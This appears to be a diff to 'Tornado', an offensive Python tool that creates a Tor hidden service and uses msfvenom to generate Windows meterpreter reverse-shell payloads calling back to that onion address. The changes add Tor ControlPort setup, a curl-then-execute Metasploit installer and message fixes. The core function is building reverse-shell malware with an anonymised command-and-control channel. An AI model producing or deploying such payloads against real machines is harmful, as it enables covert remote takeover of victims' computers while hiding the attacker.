@@ -37,36 +37,39 @@ class T0rnado():
 
     def startup(self):
         print(banner)
-        logger.info(f'Tornado Engine ({green}v{self.version}{reset}) is initialising..')
+        logger.info(f'Tornado Engine ({green}v{self.version}{reset}) is initialising.')
         if os.name == 'nt':
             logger.error('Tornado doesn\'t have Windows Support for now.')
-            logger.error('Run it with WSL technology or Linux machine.')
+            logger.error('Run it with WSL technology or Kali Linux machine.')
             logger.error('Any contributions you make are greatly appreciated especially Windows Integration to github.com/samet-g/tornado')
         else:
             logger.warn('Use with caution. You are responsible for your actions.')
             logger.warn('Developers assume no liability and are not responsible for any misuse or damage.')
 
     def install(self):
-        req = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
-        if req:
+        tor = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
+        if tor:
             logger.info('Tor is downloading..')
-            subprocess.run(['sudo', 'apt-get', 'update'], stdout=subprocess.PIPE)
-            subprocess.run(['sudo', 'apt-get', 'install', 'tor'], stdout=subprocess.PIPE)
+            subprocess.run(['sudo', 'apt', 'update'], stdout=subprocess.PIPE)
+            subprocess.run(['sudo', 'apt', 'install', 'tor'], stdout=subprocess.PIPE)
+            logger.goodt('Tor is succesfully downloaded.')
         else:
-            logger.good('Tor is started.')
-            subprocess.run(['tor', '--quiet', '&'], stdout=subprocess.PIPE)
-        requ = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
-        if requ:
-            logger.info('Metasploit Framework is downloading..')
-            subprocess.run(['sudo', 'apt-get', 'update'], stdout=subprocess.PIPE)
-            subprocess.run(['sudo', 'apt-get', 'install', 'metasploit-framework'])
+            pass
+        msfvenom = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
+        if msfvenom:
+            try:
+                logger.info('Metasploit is downloading..')
+                subprocess.run(['sudo', 'apt', 'update'], stdout=subprocess.PIPE)
+                os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod 755 msfinstall && sudo./msfinstall')
+                logger.goodt('Metasploit is succesfully downloaded.')
+            except:
+                logger.errort('Metasploit is not downloaded.\nTry install Metasploit to your system with manually.')
         else:
-            logger.good('Metasploit Framework is started.')
+            pass
 
     def connection(self):
-        os.system("tor --quiet &")
-        time.sleep(8)
-        with Controller.from_port() as controller:
+        logger.infot('Tor connection is starting..')
+        with Controller.from_port(port=9051) as controller:
             controller.authenticate()
             logger.infot(f'Tor is running version {controller.get_version()}')
             logger.infot('Creating hidden service in hidden_service folder..')
@@ -86,7 +89,7 @@ class T0rnado():
 
         logger.infot(f'Payload: {payload}')
         logger.infot(f'Arch: {arch}')
-        logger.infot(f'Onion Adress: {host}:80')
+        logger.infot(f'Onion Address: {host}:80')
 
         logger.infot('Generating payload..')
 
@@ -98,19 +101,26 @@ class T0rnado():
             os.system(
                 f"/usr/bin/msfvenom -p windows/meterpreter_reverse_{payload} LHOST={host} LPORT=80 --platform windows -a x86 -f raw -o tornado.raw")
 
-    def kill(self):
-        logger.info('Tor service is running before start - Tor service is killing..')
+    def configure(self):
+        logger.infot('ControlPort is setting at /etc/tor/torrc file..')
         try:
+            os.system('sudo service tor stop')
             os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
-            logger.goodt('Running tor service is killed.')
+            os.system("sudo bash -c 'echo \"ControlPort 9051\" >> /etc/tor/torrc'")
+            logger.goodt('ControlPort is ready.')
         except:
-            logger.errort('Tor service is not killed.')
+            logger.errort('ControlPort is not set')
+            logger.errort(f'Try to add ControlPort 9051 to Tor configuration file at /etc/tor/torrc with command:')
+            logger.warnt("""sudo bash -c 'echo "ControlPort 9051" >> /etc/tor/torrc'""")
+            os.system('sudo service tor stop')
+            os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
+            sys.exit(1)
 
     def process(self):
         self.startup()
         self.install()
         try:
-            self.kill()
+            self.configure()
         except:
             pass
         self.connection() # + self.shell(tor2web)
@@ -127,7 +137,6 @@ def main():
         if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
             print(banner)
             logger.errort('You need to run tornado with sudo or as root.')
-            #raise PermissionError("You need to run this script with sudo or as root.")
 
     if args.start:
         if check_privileges():
